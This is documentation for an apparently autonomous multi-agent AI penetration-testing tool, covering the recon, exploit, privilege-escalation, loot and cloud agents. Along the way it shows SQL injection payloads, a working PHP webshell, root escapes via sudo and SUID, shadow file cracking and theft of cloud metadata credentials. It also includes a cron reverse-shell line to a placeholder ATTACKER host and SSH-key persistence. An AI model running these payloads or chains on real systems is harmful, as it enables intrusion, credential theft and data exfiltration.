# Clicky Agents

> **Navigation**: [Usage](usage.md) | [Architecture](architecture.md) | [Agents](agents.md) | [Workflow](workflow.md) | [Skills](skills.md) | [README](../README.md)

---

## Table of Contents

1. [Understanding Agents](#understanding-agents)
2. [Recon Agent](#recon-agent)
3. [Decision Agent](#decision-agent)
4. [Exploit Agent](#exploit-agent)
5. [Privesc Agent](#privesc-agent)
6. [Loot Agent](#loot-agent)
7. [Cloud Recon Agent](#cloud-recon-agent)
8. [Agent Interaction Patterns](#agent-interaction-patterns)

---

## Understanding Agents

### What Makes an Agent Different from a Regular AI?

A regular AI conversation is stateless - you ask a question, get an answer, done. An **agent** is an AI configured to:

1. **Perform tasks autonomously**: Execute commands, read files, make decisions
2. **Use tools**: Bash commands, file operations, network requests
3. **Follow a specialized role**: Each agent is an expert in one domain
4. **Produce structured output**: JSON that other agents can parse

### Agent Anatomy

Every Clicky agent has these components:

```mermaid
flowchart TB
    subgraph AgentDefinition["Agent Definition File (.md)"]
        SP["System Prompt<br/>(Who am I? What do I do?)"]
        TOOLS["Tool Access<br/>(What can I use?)"]
        CONFIG["Configuration<br/>(Model, temperature, timeout)"]
    end

    subgraph Runtime["Runtime Behavior"]
        INPUT["Receive Input<br/>(Target, context, prior findings)"]
        PROCESS["Process & Execute<br/>(Run commands, analyze)"]
        OUTPUT["Return Output<br/>(Structured JSON)"]
    end

    AgentDefinition --> Runtime
    INPUT --> PROCESS --> OUTPUT
```

### The Agent Hierarchy

```mermaid
flowchart LR
    subgraph Reconnaissance["Phase 1: Reconnaissance"]
        RECON["Recon Agent"]
        CLOUD["Cloud Recon Agent"]
    end

    subgraph Analysis["Phase 2: Analysis"]
        DECISION["Decision Agent"]
    end

    subgraph Exploitation["Phase 3-4: Attack"]
        EXPLOIT["Exploit Agent"]
        PRIVESC["Privesc Agent"]
    end

    subgraph Collection["Phase 5: Collection"]
        LOOT["Loot Agent"]
    end

    RECON --> DECISION
    CLOUD --> DECISION
    DECISION --> EXPLOIT
    EXPLOIT --> PRIVESC
    PRIVESC --> LOOT
    EXPLOIT --> LOOT
```

---

## Recon Agent

### Purpose

The Recon Agent is your **eyes and ears**. Before you can attack anything, you need to know what's there. This agent discovers:

- What ports are open (where can we connect?)
- What services are running (what software is listening?)
- What versions are installed (are they vulnerable?)
- What environment is this (Linux? Windows? Cloud?)

### How It Works

```mermaid
sequenceDiagram
    participant O as Orchestrator
    participant R as Recon Agent
    participant N as nmap
    participant T as Target

    O->>R: Enumerate 10.10.10.10

    Note over R: Step 1: Full port scan

    R->>N: nmap -p- -T4 10.10.10.10
    N->>T: TCP SYN to all 65535 ports
    T-->>N: RST (closed) or SYN-ACK (open)
    N-->>R: Ports 21, 22, 80, 445 open

    Note over R: Step 2: Service detection

    R->>N: nmap -sV -sC -p 21,22,80,445 10.10.10.10
    N->>T: Service probes
    T-->>N: Service banners
    N-->>R: FTP vsftpd 3.0.3, SSH OpenSSH 7.9...

    Note over R: Step 3: Quick access checks

    R->>T: FTP anonymous login attempt
    T-->>R: 230 Login successful

    R->>T: SMB null session attempt
    T-->>R: Access denied

    Note over R: Step 4: Compile results

    R-->>O: JSON with services, priorities, recommendations
```

### Technical Deep Dive: Port Scanning

**What is a port?** Think of an IP address as a building's street address. Ports are like apartment numbers - there are 65,535 of them (0-65535), and different services live at different ports.

**Common ports:**

| Port | Service | What It Does |
|------|---------|--------------|
| 21 | FTP | File transfer |
| 22 | SSH | Secure remote access |
| 80 | HTTP | Web (unencrypted) |
| 443 | HTTPS | Web (encrypted) |
| 445 | SMB | Windows file sharing |
| 3306 | MySQL | Database |
| 3389 | RDP | Windows remote desktop |

**How nmap finds open ports:**

```text
Your Computer                    Target
     |                              |
     |---[SYN]-------------------->|  "Hey, anyone there?"
     |                              |
     |<--[SYN-ACK]-----------------| (Port OPEN) "Yes, I'm listening!"
     |---[RST]-------------------->| "OK, just checking, bye"
     |                              |
     |---[SYN]-------------------->|  "Hey, anyone there?"
     |<--[RST]---------------------| (Port CLOSED) "Go away"
     |                              |
     |---[SYN]-------------------->|  "Hey, anyone there?"
     |          (silence)          | (Port FILTERED) Firewall blocked it
```

### Service Detection Explained

Finding an open port isn't enough. Port 80 usually runs HTTP, but it could run anything. **Service detection** sends probes and analyzes responses:

```text
nmap sends: "GET / HTTP/1.0\r\n\r\n"
Target responds: "HTTP/1.1 200 OK\r\nServer: Apache/2.4.41 (Ubuntu)\r\n..."

nmap concludes: Port 80 = HTTP, Apache 2.4.41, Ubuntu
```

This version information is critical for finding exploits.

### Recon Agent Output

```json
{
  "status": "success",
  "target": "10.10.10.10",
  "scan_duration": "127 seconds",

  "services": [
    {
      "port": 21,
      "protocol": "tcp",
      "state": "open",
      "service": "ftp",
      "product": "vsftpd",
      "version": "3.0.3",
      "extra_info": "Unix",

      "anonymous_access": true,
      "files_found": ["backup.zip", "notes.txt"],

      "attack_vectors": [
        {
          "technique": "anonymous_login",
          "mitre_id": "T1078.001",
          "description": "Anonymous FTP access allows unauthenticated file access"
        }
      ],

      "priority": 1,
      "priority_reason": "Anonymous access confirmed, high-value files present"
    },
    {
      "port": 80,
      "protocol": "tcp",
      "state": "open",
      "service": "http",
      "product": "Apache",
      "version": "2.4.41",

      "technologies": {
        "web_server": "Apache 2.4.41",
        "language": "PHP 7.4.3",
        "cms": "WordPress 5.8.1",
        "os": "Ubuntu"
      },

      "attack_vectors": [
        {
          "technique": "sqli",
          "mitre_id": "T1190",
          "description": "SQL injection in web application"
        },
        {
          "technique": "file_upload",
          "mitre_id": "T1105",
          "description": "Arbitrary file upload for webshell"
        }
      ],

      "priority": 2,
      "priority_reason": "WordPress detected, common target for vulnerabilities"
    }
  ],

  "environment": {
    "os_detection": "Linux 4.15 - 5.6",
    "os_family": "Linux",
    "hostname": "target.local",
    "active_directory": false,
    "cloud_provider": null,
    "container_hints": false
  },

  "summary": {
    "total_ports_scanned": 65535,
    "open_ports": 4,
    "services_identified": 4,
    "high_priority_targets": 2
  }
}
```

### Priority Assignment Logic

The Recon Agent assigns priorities based on success rates from pentesting research:

| Condition | Priority | Reasoning |
|-----------|----------|-----------|
| FTP + Anonymous access | P1 | 100% success, often contains credentials |
| SMB + Null session | P1 | 75% success, reveals users and files |
| HTTP + CMS detected | P2 | 85% success, many known vulnerabilities |
| SSH (no creds yet) | P3 | Need credentials from other sources |
| Unknown service | P4 | Requires manual investigation |

---

## Decision Agent

### Purpose

The Decision Agent is the **strategist**. It takes reconnaissance data and creates an attack plan. It answers:

- What should we attack first?
- What techniques should we use?
- What do we do if an attack fails?

### The Decision Tree

This decision tree is based on **pentesting research**. It's not guesswork - it's what actually works.

```mermaid
flowchart TD
    START["Recon Complete<br/>Services Identified"] --> CHECK_FTP{"FTP (21) Found?"}

    CHECK_FTP -->|Yes| FTP_ANON{"Anonymous<br/>Access?"}
    FTP_ANON -->|Yes| DO_FTP["Priority 1<br/>Download all files<br/>Search for credentials"]
    FTP_ANON -->|No| CHECK_SMB

    CHECK_FTP -->|No| CHECK_SMB{"SMB (445) Found?"}
    CHECK_SMB -->|Yes| SMB_NULL{"Null Session<br/>Works?"}
    SMB_NULL -->|Yes| DO_SMB["Priority 1<br/>Enumerate shares<br/>Download files<br/>List users"]
    SMB_NULL -->|No| CHECK_HTTP

    CHECK_SMB -->|No| CHECK_HTTP{"HTTP (80/443)<br/>Found?"}
    CHECK_HTTP -->|Yes| DO_HTTP["Priority 2<br/>Tech detection<br/>Vuln scanning<br/>SQLi, Upload, LFI"]

    CHECK_HTTP -->|No| CHECK_OTHER{"Other Services?<br/>MySQL, Redis, RDP..."}
    CHECK_OTHER -->|Yes| DO_OTHER["Priority 3<br/>Default credentials<br/>Known exploits"]
    CHECK_OTHER -->|No| DEEP["Deeper Enumeration<br/>UDP scan<br/>Subdomain enum"]

    DO_FTP --> CREDS{"Credentials<br/>Found?"}
    DO_SMB --> CREDS
    DO_HTTP --> CREDS
    DO_OTHER --> CREDS

    CREDS -->|Yes| REUSE["Test Credential Reuse<br/>SSH, RDP, Web Login"]
    CREDS -->|No| NEXT["Try Next Priority"]
```

### Attack Chain Selection

The Decision Agent doesn't just pick one attack. It creates a **chain** - a sequence of attacks where each step enables the next.

**Chain A: Credential Hunting** (85% success rate)

```text
1. Anonymous FTP → Download files
2. Search files for passwords/keys
3. Use credentials on SSH/RDP/Web
4. If access: Proceed to privesc
```

**Chain B: Web Exploitation** (75% success rate)

```text
1. Enumerate web application
2. Find SQL injection or file upload
3. Get shell via webshell or SQLi → RCE
4. If access: Proceed to privesc
```

**Chain C: Default Credentials** (100% when applicable)

```text
1. Identify service (MySQL, Tomcat, etc.)
2. Try default credentials
3. If access: Proceed to exploitation
```

### Decision Agent Output

```json
{
  "status": "success",
  "analysis_time": "45 seconds",

  "attack_plan": {
    "primary_chain": "A",
    "chain_name": "Credential Hunting",
    "estimated_success": 0.85,

    "steps": [
      {
        "step": 1,
        "priority": 1,
        "action": "exploit_ftp_anonymous",
        "target": "10.10.10.10:21",
        "technique": "Anonymous FTP Access",
        "mitre_id": "T1078.001",
        "expected_outcome": "File access, potential credentials",
        "timeout": 120,
        "on_success": "proceed_to_step_2",
        "on_failure": "skip_to_step_3"
      },
      {
        "step": 2,
        "priority": 1,
        "action": "search_credentials",
        "target": "downloaded_files",
        "technique": "Credential Discovery",
        "mitre_id": "T1552.001",
        "search_patterns": [
          "password", "passwd", "pwd",
          "credential", "secret", "key",
          "-----BEGIN RSA PRIVATE KEY-----"
        ],
        "expected_outcome": "Cleartext passwords or SSH keys",
        "on_success": "proceed_to_step_3",
        "on_failure": "proceed_to_step_4"
      },
      {
        "step": 3,
        "priority": 2,
        "action": "credential_reuse",
        "targets": ["10.10.10.10:22", "10.10.10.10:80"],
        "technique": "Credential Reuse",
        "mitre_id": "T1078",
        "credentials_to_try": "${discovered_credentials}",
        "expected_outcome": "SSH or web application access",
        "on_success": "foothold_achieved",
        "on_failure": "proceed_to_step_4"
      },
      {
        "step": 4,
        "priority": 2,
        "action": "web_vulnerability_scan",
        "target": "10.10.10.10:80",
        "technique": "Web Application Attacks",
        "mitre_id": "T1190",
        "tests": ["sqli", "file_upload", "lfi", "command_injection"],
        "expected_outcome": "Web shell or database access",
        "on_success": "foothold_achieved",
        "on_failure": "escalate_to_manual"
      }
    ]
  },

  "fallback_plan": {
    "trigger": "all_automated_attacks_failed",
    "actions": [
      "Perform UDP scan for additional services",
      "Run more aggressive directory brute-force",
      "Check for subdomain takeover",
      "Manual code review if source available"
    ]
  },

  "risk_assessment": {
    "detection_risk": "low",
    "destructive_risk": "none",
    "estimated_time": "15-30 minutes"
  }
}
```

---

## Exploit Agent

### Purpose

The Exploit Agent is the **attacker**. It takes the attack plan and executes it, attempting to gain initial access to the target system.

### Exploitation Categories

```mermaid
mindmap
  root((Exploit Agent))
    Network Services
      FTP Anonymous
      SMB Null Session
      SSH Key Auth
      Default Credentials
    Web Applications
      SQL Injection
      File Upload
      LFI/RFI
      Command Injection
      Authentication Bypass
    Modern Infrastructure
      API Exploitation
      Container Escape
      Cloud Metadata
    Active Directory
      Kerberoasting
      Pass-the-Hash
      LLMNR Poisoning
```

### SQL Injection Deep Dive

**What is SQL Injection?**

Web applications often build database queries using user input. If they don't properly sanitize that input, attackers can inject their own SQL code.

**Vulnerable code:**

```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

**Normal login:**

```text
Username: admin
Password: password123

Query becomes:
SELECT * FROM users WHERE username='admin' AND password='password123'
```

**SQL Injection attack:**

```text
Username: admin' OR '1'='1' --
Password: anything

Query becomes:
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
                                              ^^^^^^^^ Always true!
                                                        ^^ Comment ignores rest
```

The `OR '1'='1'` is always true, so the query returns all users. The `--` comments out the password check.

**Exploit Agent's SQLi testing process:**

```mermaid
sequenceDiagram
    participant E as Exploit Agent
    participant S as sqlmap
    participant T as Target

    E->>S: Test login form for SQLi

    Note over S: Step 1: Detect vulnerability

    S->>T: username=admin'
    T-->>S: SQL error in response
    Note over S: Error-based SQLi confirmed!

    Note over S: Step 2: Identify database

    S->>T: username=admin' AND 1=CONVERT(int,@@version)--
    T-->>S: Error reveals "Microsoft SQL Server 2019"

    Note over S: Step 3: Extract data

    S->>T: username=admin' UNION SELECT username,password FROM users--
    T-->>S: Returns all usernames and password hashes

    S-->>E: Found 3 users with password hashes

    E->>E: Attempt to crack hashes
```

### File Upload Exploitation

**What's the vulnerability?**

Web apps that allow file uploads (profile pictures, documents) can be tricked into accepting executable files (PHP, ASPX, JSP).

**Attack process:**

```mermaid
flowchart TD
    START["Find upload function"] --> TEST1{"Accepts .php?"}
    TEST1 -->|Yes| UPLOAD["Upload webshell.php"]
    TEST1 -->|No| TEST2{"Accepts .php5?<br/>.phtml?<br/>.phar?"}
    TEST2 -->|Yes| UPLOAD
    TEST2 -->|No| TEST3{"Double extension?<br/>shell.php.jpg"}
    TEST3 -->|Yes| UPLOAD
    TEST3 -->|No| TEST4{"Null byte?<br/>shell.php%00.jpg"}
    TEST4 -->|Yes| UPLOAD
    TEST4 -->|No| TEST5{"Content-Type<br/>bypass?"}
    TEST5 -->|Yes| UPLOAD
    TEST5 -->|No| FAIL["Upload blocked"]

    UPLOAD --> ACCESS["Access uploaded file"]
    ACCESS --> SHELL["Execute commands<br/>through webshell"]
```

**Simple PHP webshell:**

```php
<?php
// webshell.php
// WARNING: This is for educational/authorized testing only

if(isset($_GET['cmd'])) {
    echo "<pre>";
    echo shell_exec($_GET['cmd']);
    echo "</pre>";
}
?>
```

**Using the webshell:**

```text
http://target/uploads/webshell.php?cmd=whoami
Output: www-data

http://target/uploads/webshell.php?cmd=cat /etc/passwd
Output: root:x:0:0:root:/root:/bin/bash
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        ...
```

### Shell Stabilization

Raw webshells and basic reverse shells are fragile. The Exploit Agent stabilizes them:

```mermaid
flowchart LR
    subgraph Unstable["Unstable Shell"]
        U1["No arrow keys"]
        U2["No tab completion"]
        U3["Ctrl+C kills shell"]
        U4["No job control"]
    end

    subgraph Upgrade["Upgrade Process"]
        S1["python -c 'import pty;<br/>pty.spawn(\"/bin/bash\")'"]
        S2["Ctrl+Z (background)"]
        S3["stty raw -echo; fg"]
        S4["export TERM=xterm"]
    end

    subgraph Stable["Stable Shell"]
        ST1["Full TTY"]
        ST2["Arrow keys work"]
        ST3["Tab completion"]
        ST4["Can use vim, nano"]
    end

    Unstable --> Upgrade --> Stable
```

### Exploit Agent Output

```json
{
  "status": "success",
  "exploitation_phase": "complete",

  "access_achieved": {
    "type": "reverse_shell",
    "user": "www-data",
    "privilege_level": "user",
    "shell_type": "bash",
    "stability": "stable",
    "connection": {
      "method": "php_webshell_to_reverse",
      "local_port": 4444
    }
  },

  "attack_path": [
    {
      "step": 1,
      "technique": "SQL Injection",
      "target": "http://10.10.10.10/login.php",
      "result": "Extracted admin password hash",
      "hash": "5f4dcc3b5aa765d61d8327deb882cf99"
    },
    {
      "step": 2,
      "technique": "Hash Cracking",
      "result": "Password cracked",
      "password": "password"
    },
    {
      "step": 3,
      "technique": "Admin Panel Access",
      "target": "http://10.10.10.10/admin/",
      "result": "Logged in as admin"
    },
    {
      "step": 4,
      "technique": "File Upload",
      "target": "http://10.10.10.10/admin/upload.php",
      "result": "Uploaded webshell.php"
    },
    {
      "step": 5,
      "technique": "Reverse Shell",
      "result": "Stable shell as www-data"
    }
  ],

  "credentials_found": [
    {
      "source": "database",
      "username": "admin",
      "password": "password",
      "hash": "5f4dcc3b5aa765d61d8327deb882cf99",
      "hash_type": "MD5"
    }
  ],

  "next_phase": "privilege_escalation"
}
```

---

## Privesc Agent

### Purpose

The Privesc Agent turns **limited access into complete control**. Getting a shell as `www-data` or a regular user is just the beginning. The goal is `root` (Linux) or `SYSTEM/Administrator` (Windows).

### Why Privilege Escalation Matters

```text
As www-data (web user):
- Can read web files
- Can't read /etc/shadow (password hashes)
- Can't install backdoors
- Can't access other users' files
- Limited to web directory

As root:
- Full system access
- Read all files
- Install persistent access
- Pivot to other systems
- Complete compromise
```

### Linux Privilege Escalation

```mermaid
flowchart TD
    USER["User Shell<br/>(www-data, user, etc.)"] --> ENUM["Run Enumeration<br/>(LinPEAS)"]

    ENUM --> SUDO{"sudo -l<br/>returns anything?"}
    SUDO -->|Yes| SUDO_EXPLOIT["Exploit sudo<br/>misconfiguration"]
    SUDO_EXPLOIT --> ROOT

    SUDO -->|No| SUID{"SUID binaries<br/>found?"}
    SUID -->|Yes| SUID_EXPLOIT["Exploit SUID<br/>(GTFOBins)"]
    SUID_EXPLOIT --> ROOT

    SUID -->|No| CRON{"Writable cron<br/>or PATH hijack?"}
    CRON -->|Yes| CRON_EXPLOIT["Exploit cron job"]
    CRON_EXPLOIT --> ROOT

    CRON -->|No| KERNEL{"Kernel<br/>vulnerable?"}
    KERNEL -->|Yes| KERNEL_EXPLOIT["Kernel exploit<br/>(DirtyPipe, etc.)"]
    KERNEL_EXPLOIT --> ROOT

    KERNEL -->|No| FAIL["Manual<br/>investigation"]

    ROOT["ROOT ACCESS"]
```

### Understanding SUDO Misconfiguration

**What is sudo?** The `sudo` command lets users run commands as another user (usually root). System admins configure what commands users can run with sudo.

**Check what you can run:**

```bash
$ sudo -l
User www-data may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/vim
```

**Why is this vulnerable?** Vim can spawn a shell:

```bash
$ sudo vim -c ':!/bin/bash'
root@target# whoami
root
```

The Privesc Agent knows these "escape sequences" for many programs. This knowledge comes from **GTFOBins** (https://gtfobins.github.io/), a curated list of Unix binaries that can be exploited.

### Understanding SUID Binaries

**What is SUID?** The Set User ID bit makes a program run as its owner, not as the user who launched it. When a binary is owned by root and has SUID set, it runs as root even when launched by a regular user.

**Normal execution:**

```text
$ /usr/bin/cat /etc/shadow
Permission denied (running as www-data)
```

**SUID execution:**

```text
$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 59640 Mar 22 2019 /usr/bin/passwd
    ^
    The 's' means SUID is set

$ /usr/bin/passwd  # Runs as root, so it can modify /etc/shadow
```

**Finding exploitable SUID binaries:**

```bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find          # <-- This can be exploited!
/usr/bin/vim           # <-- This can be exploited!
/opt/custom_backup     # <-- Unknown binary, investigate!
```

**Exploiting SUID find:**

```bash
$ /usr/bin/find . -exec /bin/bash -p \;
root@target# whoami
root
```

### Windows Privilege Escalation

```mermaid
flowchart TD
    USER["User Shell"] --> ENUM["Run WinPEAS"]

    ENUM --> TOKEN{"SeImpersonate<br/>privilege?"}
    TOKEN -->|Yes| POTATO["Potato exploit<br/>(PrintSpoofer)"]
    POTATO --> ADMIN

    TOKEN -->|No| SERVICE{"Service<br/>misconfiguration?"}
    SERVICE -->|Yes| SVC_EXPLOIT["Exploit service"]
    SVC_EXPLOIT --> ADMIN

    SERVICE -->|No| SCHTASK{"Writable<br/>scheduled task?"}
    SCHTASK -->|Yes| TASK_EXPLOIT["Modify task"]
    TASK_EXPLOIT --> ADMIN

    SCHTASK -->|No| CREDS{"Stored<br/>credentials?"}
    CREDS -->|Yes| USE_CREDS["Use credentials"]
    USE_CREDS --> ADMIN

    CREDS -->|No| FAIL["Manual<br/>investigation"]

    ADMIN["ADMIN/SYSTEM"]
```

### The Potato Attacks Explained

**What is SeImpersonatePrivilege?**

Windows services often run with this privilege, which allows them to impersonate other users' tokens. If you can trick a high-privilege process into connecting to you, you can steal its token.

**How Potato attacks work:**

```mermaid
sequenceDiagram
    participant A as Attacker (Low Priv)
    participant S as SYSTEM Service
    participant P as Potato Tool

    A->>P: Launch Potato exploit
    P->>P: Create fake service endpoint
    P->>S: Trigger SYSTEM to connect
    S->>P: SYSTEM connects (authenticates)
    P->>P: Capture SYSTEM token
    P->>A: Execute command as SYSTEM

    Note over A: whoami returns "NT AUTHORITY\SYSTEM"
```

### Privesc Agent Output

```json
{
  "status": "success",
  "escalation_achieved": true,

  "initial_access": {
    "user": "www-data",
    "groups": ["www-data"],
    "privilege_level": "user"
  },

  "final_access": {
    "user": "root",
    "privilege_level": "root",
    "method": "sudo_vim_escape"
  },

  "escalation_path": [
    {
      "step": 1,
      "action": "enumeration",
      "tool": "linpeas.sh",
      "findings": [
        "sudo vim without password",
        "SUID on /usr/bin/find",
        "Writable /etc/cron.d/"
      ]
    },
    {
      "step": 2,
      "action": "exploit_selection",
      "chosen": "sudo_vim_escape",
      "reason": "Highest success probability, no compilation needed"
    },
    {
      "step": 3,
      "action": "exploitation",
      "command": "sudo vim -c ':!/bin/bash'",
      "result": "Root shell obtained"
    },
    {
      "step": 4,
      "action": "persistence",
      "method": "ssh_key_injection",
      "target": "/root/.ssh/authorized_keys"
    }
  ],

  "alternative_paths": [
    {
      "method": "suid_find",
      "command": "find . -exec /bin/bash -p \\;",
      "status": "available_but_not_used"
    },
    {
      "method": "cron_hijack",
      "command": "echo 'bash -i >& /dev/tcp/ATTACKER/4445 0>&1' > /etc/cron.d/backdoor",
      "status": "available_but_not_used"
    }
  ]
}
```

---

## Loot Agent

### Purpose

The Loot Agent **extracts valuable data** after access is achieved. This includes:

- Credentials (passwords, hashes, keys)
- Configuration files
- Database contents
- Sensitive documents
- Evidence for reporting

### What to Extract and Why

```mermaid
mindmap
  root((Loot Priorities))
    P1: Credentials
      /etc/shadow
      SSH keys
      Database creds
      Browser passwords
      .bash_history
    P2: Configuration
      Network config
      Service configs
      Application settings
      Cloud credentials
    P3: Data
      Databases
      Documents
      Source code
      Backups
    P4: Intelligence
      User lists
      Network topology
      Internal documentation
```

### Linux Credential Extraction

**The /etc/shadow file:**

```text
root:$6$xyz...:18000:0:99999:7:::
     ^^^^^^^^^^^
     Password hash

Format: $algorithm$salt$hash
$1$ = MD5 (weak)
$5$ = SHA-256
$6$ = SHA-512 (most common)
$y$ = yescrypt (newest)
```

**Extracting and cracking:**

```bash
# On target (as root)
cat /etc/shadow > /tmp/shadow.txt
cat /etc/passwd > /tmp/passwd.txt

# Combine for cracking
unshadow passwd.txt shadow.txt > combined.txt

# Crack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
```

**SSH keys:**

```bash
# Find all SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Common locations
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa
```

### Database Extraction

```mermaid
sequenceDiagram
    participant L as Loot Agent
    participant DB as Database
    participant F as File System

    L->>F: Read config files for DB creds
    F-->>L: mysql://root:password123@localhost/app

    L->>DB: Connect with credentials
    DB-->>L: Connected

    L->>DB: SHOW DATABASES;
    DB-->>L: information_schema, mysql, app

    L->>DB: USE app; SHOW TABLES;
    DB-->>L: users, orders, payments

    L->>DB: SELECT * FROM users;
    DB-->>L: id, username, password, email...

    L->>L: Save to loot/databases/app_users.csv
```

### Loot Organization

```text
loot/10.10.10.10/
|
|-- credentials/
|   |-- cleartext.txt          # user:password pairs
|   |-- hashes.txt             # user:hash pairs
|   |-- cracked.txt            # Successfully cracked
|   |-- ssh_keys/
|       |-- root_id_rsa        # Root's SSH key
|       |-- admin_id_rsa       # Admin's SSH key
|
|-- databases/
|   |-- mysql_users.csv        # MySQL user table
|   |-- app_dump.sql           # Full database dump
|
|-- configs/
|   |-- etc_passwd.txt         # /etc/passwd
|   |-- etc_shadow.txt         # /etc/shadow
|   |-- network_interfaces.txt # Network configuration
|   |-- ssh_config.txt         # SSH server config
|
|-- documents/
|   |-- passwords.xlsx         # Found password spreadsheet
|   |-- network_diagram.pdf    # Internal network docs
|
|-- evidence/
|   |-- root_proof.txt         # Proof of root access
|   |-- screenshots/           # Visual evidence
```

---

## Cloud Recon Agent

### Purpose

The Cloud Recon Agent specializes in **cloud and container environments**. It detects AWS, Azure, GCP, Kubernetes, and Docker, then enumerates their specific attack surfaces.

### Cloud Detection

```mermaid
flowchart TD
    START["Target Analysis"] --> DNS{"DNS indicates<br/>cloud?"}

    DNS -->|amazonaws.com| AWS["AWS Detected"]
    DNS -->|azure.com| AZURE["Azure Detected"]
    DNS -->|googleapis.com| GCP["GCP Detected"]
    DNS -->|No cloud DNS| HEADERS{"Check HTTP<br/>headers?"}

    HEADERS -->|X-Amz-*| AWS
    HEADERS -->|X-Azure-*| AZURE
    HEADERS -->|X-Cloud-*| GCP
    HEADERS -->|No cloud headers| META{"Metadata<br/>endpoint?"}

    META -->|169.254.169.254| IMDS["Cloud Instance<br/>Detected"]
    META -->|No response| CONTAINER{"Container<br/>indicators?"}

    CONTAINER -->|/.dockerenv exists| DOCKER["Docker Detected"]
    CONTAINER -->|K8s service account| K8S["Kubernetes Detected"]
```

### AWS Metadata Exploitation

**What is the metadata service?**

Cloud instances (EC2, Azure VMs, GCP Compute) have a special internal endpoint at `169.254.169.254` that provides instance information including **temporary credentials**.

**Exploitation process:**

```mermaid
sequenceDiagram
    participant A as Attacker (on EC2)
    participant M as Metadata Service
    participant AWS as AWS API

    A->>M: curl http://169.254.169.254/latest/meta-data/
    M-->>A: List of available metadata

    A->>M: curl .../meta-data/iam/security-credentials/
    M-->>A: EC2-Role-Name

    A->>M: curl .../meta-data/iam/security-credentials/EC2-Role-Name
    M-->>A: AccessKeyId, SecretAccessKey, Token

    Note over A: Now has temporary AWS credentials!

    A->>AWS: aws s3 ls (using stolen creds)
    AWS-->>A: List of S3 buckets

    A->>AWS: aws s3 cp s3://internal-bucket/secrets.txt .
    AWS-->>A: Downloaded sensitive file
```

### Kubernetes Enumeration

**Service Account Tokens:**

Every pod in Kubernetes gets a service account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. This token can often access the K8s API.

```bash
# Inside a pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# List pods (if allowed)
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods

# List secrets (high value!)
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets
```

---

## Agent Interaction Patterns

### Sequential Handoff

Most common pattern - one agent completes, hands off to the next:

```mermaid
sequenceDiagram
    participant O as Orchestrator
    participant R as Recon
    participant D as Decision
    participant E as Exploit
    participant P as Privesc
    participant L as Loot

    O->>R: Enumerate target
    R-->>O: Services found

    O->>D: Analyze services
    D-->>O: Attack plan

    O->>E: Execute plan
    E-->>O: Shell obtained

    O->>P: Escalate privileges
    P-->>O: Root access

    O->>L: Extract data
    L-->>O: Loot collected
```

### Parallel Execution

When tasks are independent, agents run simultaneously:

```mermaid
sequenceDiagram
    participant O as Orchestrator
    participant R as Recon
    participant C as Cloud Recon

    O->>R: Enumerate network services
    O->>C: Enumerate cloud services

    par Parallel Execution
        R->>R: nmap scan
        C->>C: Cloud detection
    end

    R-->>O: Network services
    C-->>O: Cloud services

    Note over O: Combine results for analysis
```

### Feedback Loop

When attacks fail, the system loops back:

```mermaid
sequenceDiagram
    participant O as Orchestrator
    participant D as Decision
    participant E as Exploit

    O->>D: Analyze services
    D-->>O: Attack plan (3 priorities)

    O->>E: Try Priority 1
    E-->>O: Failed

    O->>D: P1 failed, what next?
    D-->>O: Try Priority 2

    O->>E: Try Priority 2
    E-->>O: Failed

    O->>D: P2 failed, what next?
    D-->>O: Try Priority 3

    O->>E: Try Priority 3
    E-->>O: Success! Shell obtained

    O->>O: Proceed to privesc
```
